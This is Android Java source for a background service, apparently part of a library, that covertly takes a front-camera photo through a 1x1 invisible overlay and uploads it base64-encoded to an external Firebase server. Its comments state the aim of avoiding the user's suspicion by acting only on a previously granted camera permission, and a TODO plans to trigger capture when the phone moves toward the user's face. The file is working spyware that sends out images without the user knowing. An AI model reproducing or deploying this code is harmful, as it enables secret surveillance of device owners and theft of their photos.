package com.example.tim.plutotjmille2cameralibrary.service;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.support.v4.content.ContextCompat;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.example.tim.plutotjmille2cameralibrary.R;
import com.firebase.client.Firebase;

import java.io.IOException;

/**
 * Created by Tim on 3/26/16.
 */
public class CameraService extends Service implements SensorEventListener {

    private SensorManager mSensorManager;
    private Sensor accelerometer;
    private Sensor magnetometer;
    private boolean hasCamera;
    private boolean hasFrontCamera;
    private int cameraId;


    @Override
    public void onCreate() {
        super.onCreate();
        Firebase.setAndroidContext(this);
        showMessage("Taking photo");

        /*
        Gyroscope/Accelerometer boilerplate code

        TODO:
        Extend project to take photo when motion towards user face is detected.

         */
        //mSensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        //accelerometer = mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        //magnetometer = mSensorManager.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD);

        //register your sensor manager listener here
        //mSensorManager.registerListener(this, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
        //mSensorManager.registerListener(this, magnetometer, SensorManager.SENSOR_DELAY_NORMAL);

        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP) {
            // No special permissions required
            if(checkCameraPermission()) {
                takePhoto(this);
            }

        } else {
            // MM or later
            int permissionCheck = ContextCompat.checkSelfPermission(this,
                    Manifest.permission.CAMERA);
            if(permissionCheck == PackageManager.PERMISSION_GRANTED) {
                takePhoto(this);
            }

        }
    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onSensorChanged(SensorEvent event) {
        if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {
            //detect the shake and do your work here
        }

    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int i) {

    }


    /**
     * Gather device characteristics, eg. has camera & front facing camera.
     * if MM or later, permission requesting is mandatory to gain Camera access.
     * We want to avoid suspicion, so we only take a photo on MM if the permission
     * was previously granted.
     *
     * @param context
     */
    @SuppressWarnings("deprecation")
    private void takePhoto(final Context context) {
        if(context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
            cameraId = getFrontCameraId();
            hasCamera = true;
            hasFrontCamera = (cameraId != -1);
        }else{
            hasCamera = false;
        }

        if(!hasCamera) {
            // no camera detected
            return;
        }

        final SurfaceView preview = new SurfaceView(context);
        SurfaceHolder holder = preview.getHolder();
        // deprecated setting, but required on Android versions prior to 3.0
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        holder.addCallback(new SurfaceHolder.Callback() {
            @Override
            //The preview must happen at or after this point or takePicture fails
            public void surfaceCreated(SurfaceHolder holder) {
                showMessage("Surface created");
                Camera camera = null;
                try {
                    camera = Camera.open(cameraId);
                    showMessage("Opened camera");

                    if(camera == null) {
                        return;
                    }

                    try {
                        camera.setPreviewDisplay(holder);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }

                    camera.startPreview();
                    showMessage("Started preview");

                    camera.takePicture(null, null, new Camera.PictureCallback() {

                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            showMessage("Took picture");

                            try {
                                processData(data);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            camera.release();
                        }
                    });
                } catch (Exception e) {
                    if (camera != null)
                        camera.release();
                    throw new RuntimeException(e);
                }
            }

            @Override public void surfaceDestroyed(SurfaceHolder holder) {}
            @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}
        });

        WindowManager wm = (WindowManager)context
                .getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                1, 1, //Must be at least 1x1
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                0,
                //Don't know if this is a safe default
                PixelFormat.UNKNOWN);
        //Don't set the preview visibility to GONE or INVISIBLE
        wm.addView(preview, params);
    }


    /**
     *  Helper method to get the ID of front facing camera
     *  (if exists)
     * @return
     */
    private int getFrontCameraId(){
        int camId = -1;
        int numberOfCameras = Camera.getNumberOfCameras();
        Camera.CameraInfo ci = new Camera.CameraInfo();

        for(int i = 0;i < numberOfCameras;i++){
            Camera.getCameraInfo(i,ci);
            if(ci.facing == Camera.CameraInfo.CAMERA_FACING_FRONT){
                camId = i;
            }
        }

        return camId;
    }


    private static void showMessage(String message) {
        Log.i("Camera", message);
    }




    /**
     * Processing of raw camera data performed here.
     * Here, we upload the encoded data to an external server.
     * Also, the bitmap encoded byte data is posted to the
     * notification bar for testing purposes.
     **/
    private void processData(byte[] data) throws IOException {
        new SavePhotoTask().execute(data);
        boolean shouldPostNotification = true;
        if(shouldPostNotification) {
            showMessage("Posting notification");
            Bitmap bitmap = BitmapFactory.decodeByteArray(data , 0, data .length);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN) {
                Notification notif = new Notification.Builder(this)
                        .setContentTitle("New photo captured")
                        .setContentText("")
                        .setSmallIcon(R.drawable.ic_launcher)
                        .setLargeIcon(bitmap)
                        .setStyle(new Notification.BigPictureStyle()
                                .bigPicture(bitmap))
                        .build();
                NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                mNotificationManager.notify(69, notif);
                showMessage("Posted notification");
            }
        }

    }



    class SavePhotoTask extends AsyncTask<byte[], String, String> {

        @Override
        protected String doInBackground(byte[]... jpeg) {
            Firebase myFirebaseRef = new Firebase("https://pluto-test.firebaseio.com/");
            String base64 = Base64.encodeToString(jpeg[0], Base64.DEFAULT);
            myFirebaseRef.child("test_camera_image").setValue(base64);
            return null;

        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            showMessage("Saved to server");
            // service kills itself upon uploading image to server
            stopSelf();

        }

    }


    private boolean checkCameraPermission() {
        String permission = "android.permission.CAMERA";
        int res = checkCallingOrSelfPermission(permission);
        return (res == PackageManager.PERMISSION_GRANTED);
    }


}